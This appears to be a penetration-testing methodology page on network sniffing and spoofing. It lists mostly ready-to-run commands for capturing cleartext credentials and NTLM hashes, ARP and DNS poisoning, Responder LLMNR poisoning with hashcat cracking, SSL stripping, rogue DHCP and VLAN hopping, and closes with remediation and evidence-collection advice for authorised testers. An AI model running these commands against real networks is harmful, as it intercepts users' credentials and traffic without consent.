# Network Sniffing and Spoofing Testing

## Overview
Network sniffing and spoofing attacks target the data link and network layers to intercept, modify, or redirect network traffic. Sniffing involves passively capturing packets traversing a network segment, while spoofing actively injects forged packets to impersonate legitimate hosts or manipulate protocol behavior. These techniques are fundamental to Man-in-the-Middle (MITM) attacks and are used to capture credentials, session tokens, and sensitive data in transit.

## Classification
- **CWE:** CWE-319 (Cleartext Transmission of Sensitive Information), CWE-300 (Channel Accessible by Non-Endpoint), CWE-290 (Authentication Bypass by Spoofing)
- **MITRE ATT&CK:** T1040 (Network Sniffing), T1557 (Adversary-in-the-Middle), T1557.002 (ARP Cache Poisoning), T1557.001 (LLMNR/NBT-NS Poisoning)
- **CVSS Base:** 5.3 - 8.1 (Medium to High, depending on data captured)

## Detection Methodology

### 1. Passive Network Sniffing
Capture traffic without injecting any packets:
```bash
# Tcpdump - capture all traffic on an interface
tcpdump -i eth0 -w capture.pcap

# Capture specific host traffic
tcpdump -i eth0 host 10.10.10.50 -w host_capture.pcap

# Capture specific port traffic
tcpdump -i eth0 port 80 -w http_capture.pcap
tcpdump -i eth0 port 21 or port 23 or port 110 -w cleartext.pcap

# Capture credentials in cleartext protocols
tcpdump -i eth0 -A port 21    # FTP
tcpdump -i eth0 -A port 23    # Telnet
tcpdump -i eth0 -A port 110   # POP3
tcpdump -i eth0 -A port 143   # IMAP
tcpdump -i eth0 -A port 80    # HTTP

# Tshark (Wireshark CLI)
tshark -i eth0 -w capture.pcap
tshark -i eth0 -Y "http.request.method == POST" -T fields -e http.host -e http.request.uri -e urlencoded-form.value
tshark -i eth0 -Y "ftp.request.command == PASS" -T fields -e ftp.request.arg

# Capture and display HTTP credentials
tshark -i eth0 -Y "http.request.method == POST" -T fields -e http.host -e http.request.uri -e http.file_data

# Capture NTLM hashes in transit
tshark -i eth0 -Y "ntlmssp.messagetype == 3" -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain
```

### 2. ARP Spoofing / ARP Cache Poisoning
Manipulate ARP tables to intercept traffic between two hosts:
```bash
# Enable IP forwarding (to relay traffic and avoid detection)
echo 1 > /proc/sys/net/ipv4/ip_forward
# or
sysctl -w net.ipv4.ip_forward=1

# arpspoof (dsniff suite)
# Spoof gateway for victim (intercept victim's outbound traffic)
arpspoof -i eth0 -t victim_ip gateway_ip
# Spoof victim for gateway (intercept inbound traffic to victim)
arpspoof -i eth0 -t gateway_ip victim_ip

# Ettercap ARP poisoning
ettercap -T -q -i eth0 -M arp:remote /victim_ip// /gateway_ip//

# bettercap ARP spoofing
bettercap -iface eth0
> set arp.spoof.targets victim_ip
> arp.spoof on
> net.sniff on
```

### 3. DNS Spoofing
Forge DNS responses to redirect traffic:
```bash
# bettercap DNS spoofing
bettercap -iface eth0
> set dns.spoof.domains target-domain.com
> set dns.spoof.address attacker_ip
> dns.spoof on

# Ettercap DNS spoofing
# Edit /etc/ettercap/etter.dns:
# target-domain.com A attacker_ip
# *.target-domain.com A attacker_ip
ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /victim_ip// /gateway_ip//

# dnschef (standalone DNS proxy)
dnschef --fakedomains target-domain.com --fakeip attacker_ip -i attacker_ip
```

### 4. LLMNR/NBT-NS/mDNS Poisoning
Respond to local name resolution broadcasts to capture credentials:
```bash
# Responder (primary tool)
responder -I eth0 -rdwv

# Responder with specific modules
responder -I eth0 -r -d -w -F    # Force WPAD auth, NBT-NS, DHCP
responder -I eth0 -r -d -P       # Force proxy auth for HTTP

# Captured hashes location
cat /usr/share/responder/logs/*.txt

# Crack NTLMv2 hashes
hashcat -m 5600 hashes.txt wordlist.txt

# Inveigh (Windows PowerShell alternative)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y
```

### 5. MITM Attack Frameworks
```bash
# bettercap (modern, full-featured)
bettercap -iface eth0
> net.probe on                      # Discover hosts
> set arp.spoof.targets victim_ip   # Set target
> arp.spoof on                      # Start ARP spoofing
> net.sniff on                      # Capture traffic
> set http.proxy.sslstrip true      # SSL stripping
> http.proxy on                     # Start HTTP proxy
> set https.proxy.sslstrip true
> https.proxy on

# mitmproxy (HTTP/HTTPS interception)
mitmproxy -m transparent --listen-host 0.0.0.0 --listen-port 8080
# or non-interactive
mitmdump -m transparent -w output.flow

# Ettercap (classic MITM tool)
ettercap -T -q -i eth0 -M arp:remote /victim_ip// /gateway_ip// -w capture.pcap
```

### 6. SSL/TLS Stripping
Downgrade HTTPS connections to HTTP:
```bash
# sslstrip (classic)
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sslstrip -l 8080

# bettercap with SSL stripping
bettercap -iface eth0
> set http.proxy.sslstrip true
> set net.sniff.local true
> arp.spoof on
> http.proxy on
> net.sniff on

# sslstrip2 / sslstrip+
# Improved version that handles HSTS
python sslstrip2.py -l 8080 -a
```

### 7. DHCP Spoofing
```bash
# Rogue DHCP server with bettercap
bettercap -iface eth0
> set dhcp6.spoof.domains corp.local
> dhcp6.spoof on

# Ettercap DHCP spoofing
ettercap -T -q -i eth0 -M dhcp:attacker_ip/subnet/gateway_ip/dns_ip

# yersinia (layer 2 attack framework)
yersinia dhcp -attack 1 -interface eth0    # DHCP discover flood
yersinia dhcp -attack 2 -interface eth0    # Rogue DHCP server
```

### 8. VLAN Hopping
```bash
# DTP (Dynamic Trunking Protocol) attack
yersinia dtp -attack 1 -interface eth0

# 802.1Q double tagging
# Craft double-tagged frame to reach VLAN not directly accessible
scapy:
>>> sendp(Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=target_vlan)/IP(dst="target")/ICMP())

# Frogger (VLAN hopping tool)
frogger --interface eth0 --native-vlan 1 --target-vlan 100
```

## Tool Usage

### Wireshark Analysis
```bash
# Open capture file
wireshark capture.pcap

# Useful display filters
# HTTP credentials: http.request.method == "POST"
# FTP credentials: ftp.request.command == "PASS"
# DNS queries: dns.qry.name
# NTLM auth: ntlmssp
# SMB traffic: smb || smb2
# Kerberos: kerberos
# Cleartext passwords: tcp contains "password"

# Extract files from capture
tshark -r capture.pcap --export-objects http,exported_files/
tshark -r capture.pcap --export-objects smb,exported_files/
```

### PCredz (Credential Extraction)
```bash
# Extract credentials from pcap file
python3 Pcredz -f capture.pcap

# Live capture
python3 Pcredz -i eth0
```

### net-creds
```bash
# Live credential sniffing
python2 net-creds.py -i eth0

# From pcap
python2 net-creds.py -p capture.pcap
```

## Remediation
1. **Enable Dynamic ARP Inspection (DAI)** -- validate ARP packets on switches
2. **Enable DHCP snooping** -- prevent rogue DHCP servers
3. **Port security** -- limit MAC addresses per switch port
4. **802.1X (NAC)** -- enforce network access control on all ports
5. **Encrypt all traffic** -- use TLS/SSL for all communications, enforce HTTPS with HSTS
6. **Disable LLMNR and NBT-NS** -- use DNS exclusively for name resolution
7. **SMB signing** -- require SMB message signing to prevent relay attacks
8. **Network segmentation** -- isolate sensitive traffic on separate VLANs with proper ACLs
9. **Switch port hardening** -- disable DTP, set ports to access mode, implement private VLANs
10. **Certificate pinning** -- prevent SSL stripping on critical applications

## Evidence Collection
When documenting sniffing and spoofing findings:
- Packet capture files (pcap) with sensitive data redacted
- List of cleartext credentials captured (sanitized)
- Protocols transmitting sensitive data without encryption
- Network diagram showing MITM attack position
- ARP tables before and after poisoning
- Screenshots of intercepted sessions
- Impact assessment (types and volume of data exposed)
- List of hosts vulnerable to LLMNR/NBT-NS poisoning
